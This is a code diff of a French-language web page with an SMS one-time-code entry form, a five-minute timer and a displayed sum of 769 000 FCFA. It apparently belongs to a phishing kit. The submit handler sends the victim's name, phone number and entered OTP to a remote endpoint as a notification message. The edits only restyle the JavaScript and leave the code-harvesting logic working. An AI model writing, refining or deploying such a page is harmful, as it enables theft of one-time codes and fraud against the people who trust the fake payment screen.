@@ -286,17 +286,17 @@
             100% { transform: rotate(360deg); }
         }
         
-        .loading-box p {
-            font-size: 15px;
-            color: #333;
-            margin: 8px 0;
-        }
-        
         .loading-amount {
             font-size: 26px;
             font-weight: bold;
             color: #0066cc;
             margin: 10px 0;
+        }
+        
+        .loading-box p {
+            font-size: 15px;
+            color: #333;
+            margin: 8px 0;
         }
     </style>
 </head>
@@ -338,7 +338,7 @@
                     </div>
                 </div>
                 
-                <div class="otp-container" id="otpContainer">
+                <div class="otp-container">
                     <input type="text" class="otp-box" id="otp1" maxlength="1" pattern="[0-9]" inputmode="numeric">
                     <input type="text" class="otp-box" id="otp2" maxlength="1" pattern="[0-9]" inputmode="numeric">
                     <input type="text" class="otp-box" id="otp3" maxlength="1" pattern="[0-9]" inputmode="numeric">
@@ -350,7 +350,7 @@
                 </div>
                 
                 <div style="text-align: center;">
-                    <span class="amount-highlight">769 000 FCFA</span>
+                    <span class="loading-amount">769 000 FCFA</span>
                 </div>
                 
                 <div class="info-message">
@@ -397,9 +397,9 @@
             const now = new Date();
             const hours = now.getHours().toString().padStart(2, '0');
             const minutes = now.getMinutes().toString().padStart(2, '0');
-            const timeString = `${hours}:${minutes}`;
+            const timeString = hours + ':' + minutes;
             document.getElementById('currentTime').textContent = timeString;
-            document.getElementById('updateTime').textContent = `Mis à jour ${timeString}`;
+            document.getElementById('updateTime').textContent = 'Mis à jour ' + timeString;
         }
         
         updateTime();
@@ -413,7 +413,10 @@
             document.getElementById('otp4')
         ];
         
-        otpInputs.forEach((input, index) => {
+        for (let i = 0; i < otpInputs.length; i++) {
+            const input = otpInputs[i];
+            const index = i;
+            
             input.addEventListener('keyup', function(e) {
                 if (this.value.length === 1 && index < otpInputs.length - 1) {
                     otpInputs[index + 1].focus();
@@ -428,18 +431,18 @@
                     e.preventDefault();
                 }
             });
-        });
+        }
         
         // Timer de 5 minutes
         let timeLeft = 300;
         const timerElement = document.getElementById('timer');
         
-        const timerInterval = setInterval(function() {
+        setInterval(function() {
             if (timeLeft > 0) {
                 timeLeft--;
                 const minutes = Math.floor(timeLeft / 60);
                 const seconds = timeLeft % 60;
-                timerElement.innerHTML = `⏱️ Code valable encore ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                timerElement.innerHTML = '⏱️ Code valable encore ' + minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
             } else {
                 timerElement.innerHTML = '⏱️ Code expiré';
                 timerElement.style.background = '#f8d7da';
@@ -458,7 +461,7 @@
         document.getElementById('submitBtn').addEventListener('click', function(e) {
             e.preventDefault();
             
-            const otp = otpInputs.map(input => input.value).join('');
+            const otp = otpInputs[0].value + otpInputs[1].value + otpInputs[2].value + otpInputs[3].value;
             
             if (otp.length !== 4) {
                 alert('Veuillez entrer le code à 4 chiffres reçu par SMS');
@@ -475,14 +478,8 @@
                     name: firstName,
                     phone: phone,
                     otp: otp,
-                    message: `✅ Code OTP 4 chiffres reçu pour ${firstName} (${phone}): ${otp}`
+                    message: '✅ Code OTP 4 chiffres reçu pour ' + firstName + ' (' + phone + '): ' + otp
                 })
-            })
-            .then(response => {
-                console.log('Code OTP envoyé avec succès');
-            })
-            .catch(error => {
-                console.error('Erreur:', error);
             });
             
             document.getElementById('loadingOverlay').style.display = 'flex';
